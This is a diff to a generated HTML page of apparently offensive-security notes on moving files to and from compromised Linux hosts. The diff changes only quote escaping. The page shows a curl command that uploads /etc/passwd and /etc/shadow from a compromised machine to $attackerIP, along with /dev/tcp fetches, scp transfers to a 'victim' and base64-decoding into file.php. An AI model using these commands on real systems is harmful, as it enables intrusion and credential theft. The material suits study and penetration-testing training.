@@ -27104,7 +27104,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span></code></pre></div></td></tr></table></div>
 <p><strong>2.</strong> Copy the base64 string, go to the remote host and decode it and pipe to a file:</p>
 <div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
-<span class="normal"><a href="#__codelineno-1-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="go">echo -n &quot;Looooooong-string-encoded-in-base64&quot; | base64 -d &gt; file.php</span>
+<span class="normal"><a href="#__codelineno-1-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="go">echo -n "Looooooong-string-encoded-in-base64" | base64 -d &gt; file.php</span>
 </span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a><span class="gp"># </span>-n:<span class="w"> </span><span class="k">do</span><span class="w"> </span>not<span class="w"> </span>output<span class="w"> </span>the<span class="w"> </span>trailing<span class="w"> </span>newline
 </span></code></pre></div></td></tr></table></div>
 <h3 id="replicating-client-server">Replicating client-server</h3>
@@ -27141,7 +27141,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a><span class="go">exec 3&lt;&gt;/dev/tcp/$ip/80</span>
 </span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a>
 </span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4"></a><span class="gp"># </span>Requesting<span class="w"> </span>the<span class="w"> </span>file<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>server<span class="w"> </span>
-</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5"></a><span class="go">echo -e &quot;GET /file.sh HTTP/1.1\n\n&quot;&gt;&amp;3</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5"></a><span class="go">echo -e "GET /file.sh HTTP/1.1\n\n"&gt;&amp;3</span>
 </span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6"></a>
 </span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7"></a><span class="gp"># </span>Printing<span class="w"> </span>the<span class="w"> </span>Response
 </span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8"></a><span class="go">cat &lt;&amp;3</span>
@@ -27172,11 +27172,11 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span></code></pre></div></td></tr></table></div>
 <p>From the attacker machine too:</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span>
-<span class="normal"><a href="#__codelineno-8-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a># Download file foobar.txt saved in the victim&#39;s machin. Command is run from attacker machine connecting to the remote host (victim&#39;s machine)
+<span class="normal"><a href="#__codelineno-8-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a># Download file foobar.txt saved in the victim's machin. Command is run from attacker machine connecting to the remote host (victim's machine)
 </span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a>scp username@$IPvictim:foobar.txt /some/local/directory
 </span></code></pre></div></td></tr></table></div>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span>
-<span class="normal"><a href="#__codelineno-9-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a># Upload file foo.txt saved in attacker machine into the victim&#39;s. Command is run from attacker machine connecting to the remote host (victim&#39;s machine)
+<span class="normal"><a href="#__codelineno-9-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a># Upload file foo.txt saved in attacker machine into the victim's. Command is run from attacker machine connecting to the remote host (victim's machine)
 </span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a>scp foo.txt username@$IPvictim:/some/remote/directory
 </span></code></pre></div></td></tr></table></div>
 <h2 id="upload-to-linux">Upload to Linux</h2>
@@ -27204,7 +27204,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3"></a>
 </span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4"></a>
 </span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5"></a><span class="c1"># As we will use https, we will create a self-signed certificate.</span>
-</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6"></a>openssl<span class="w"> </span>req<span class="w"> </span>-x509<span class="w"> </span>-out<span class="w"> </span>server.pem<span class="w"> </span>-keyout<span class="w"> </span>server.pem<span class="w"> </span>-newkey<span class="w"> </span>rsa:2048<span class="w"> </span>-nodes<span class="w"> </span>-sha256<span class="w"> </span>-subj<span class="w"> </span><span class="s1">&#39;/CN=server&#39;</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6"></a>openssl<span class="w"> </span>req<span class="w"> </span>-x509<span class="w"> </span>-out<span class="w"> </span>server.pem<span class="w"> </span>-keyout<span class="w"> </span>server.pem<span class="w"> </span>-newkey<span class="w"> </span>rsa:2048<span class="w"> </span>-nodes<span class="w"> </span>-sha256<span class="w"> </span>-subj<span class="w"> </span><span class="s1">'/CN=server'</span>
 </span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7"></a>
 </span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8"></a><span class="c1">#  The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.</span>
 </span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9"></a>mkdir<span class="w"> </span>https<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>https
@@ -27213,8 +27213,8 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12"></a><span class="c1"># Start the web server</span>
 </span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13"></a>python3<span class="w"> </span>-m<span class="w"> </span>uploadserver<span class="w"> </span><span class="m">443</span><span class="w"> </span>--server-certificate<span class="w"> </span>/location/different/folder/server.pem
 </span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14"></a>
-</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15"></a><span class="c1"># Now from our compromised machine, let&#39;s upload the `/etc/passwd` and `/etc/shadow` files.</span>
-</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>https://<span class="nv">$attackerIP</span>/upload<span class="w"> </span>-F<span class="w"> </span><span class="s1">&#39;files=@/etc/passwd&#39;</span><span class="w"> </span>-F<span class="w"> </span><span class="s1">&#39;files=@/etc/shadow&#39;</span><span class="w"> </span>--insecure
+</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15"></a><span class="c1"># Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.</span>
+</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>https://<span class="nv">$attackerIP</span>/upload<span class="w"> </span>-F<span class="w"> </span><span class="s1">'files=@/etc/passwd'</span><span class="w"> </span>-F<span class="w"> </span><span class="s1">'files=@/etc/shadow'</span><span class="w"> </span>--insecure
 </span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17"></a><span class="c1"># We used the option --insecure because we used a self-signed certificate that we trust.</span>
 </span></code></pre></div></td></tr></table></div>
 <h3 id="ssh-uploads-scp">SSH uploads: SCP</h3>
@@ -27243,7 +27243,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span></code></pre></div></td></tr></table></div>
 <p>From the attacker machine too:</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span>
-<span class="normal"><a href="#__codelineno-12-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a># Upload file foo.txt saved in attacker machine into the victim&#39;s. Command is run from attacker machine connecting to the remote host (victim&#39;s machine)
+<span class="normal"><a href="#__codelineno-12-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a># Upload file foo.txt saved in attacker machine into the victim's. Command is run from attacker machine connecting to the remote host (victim's machine)
 </span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2"></a>scp foo.txt username@$IPvictim:/some/remote/directory
 </span></code></pre></div></td></tr></table></div>
 <h3 id="rsync-over-ssh">Rsync over SSH</h3>
@@ -27256,7 +27256,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-13-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a>rsync OPTION SourceDirectory_or_filePath user@serverIP_or_name:Target
 </span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2"></a>
 </span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3"></a># Example
-</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4"></a>rsync ~/Desktop/Dir1/&quot;source pdf sample.pdf&quot; test@192.168.56.100:~/Desktop/test
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4"></a>rsync ~/Desktop/Dir1/"source pdf sample.pdf" test@192.168.56.100:~/Desktop/test
 </span></code></pre></div></td></tr></table></div>
 <h3 id="backdoors">Backdoors</h3>
 <p>See <a href="../reverse-shells/">reverse shells</a>, <a href="../bind-shells/">bind shells</a>, and <a href="../web-shells/">web shells</a>.</p>
